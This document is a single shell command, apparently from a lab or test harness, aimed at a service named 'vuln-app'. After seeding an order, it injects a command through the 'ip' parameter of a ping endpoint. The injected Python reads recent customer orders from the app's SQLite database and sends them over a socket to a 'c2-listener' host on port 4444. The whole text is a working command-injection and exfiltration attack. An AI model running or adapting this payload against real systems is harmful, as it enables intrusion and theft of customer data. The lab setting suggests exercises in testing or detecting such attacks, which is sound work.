command: set -eu; curl -s -H 'Content-Type: application/json' -d '{"customer":"seed","item":"sku-002","quantity":2}' 'http://vuln-app:5000/api/order' >/dev/null; curl -sG 'http://vuln-app:5000/ping' --data-urlencode "ip=127.0.0.1;python -c \"import json,sqlite3,socket; conn=sqlite3.connect('/app/data/app.db'); rows=conn.execute('select customer,item,quantity from orders order by id desc limit 5').fetchall(); payload=json.dumps({'orders':[tuple(r) for r in rows]}); s=socket.socket(); s.connect(('c2-listener',4444)); s.sendall(payload.encode()); s.close()\"" >/dev/null; sleep 2
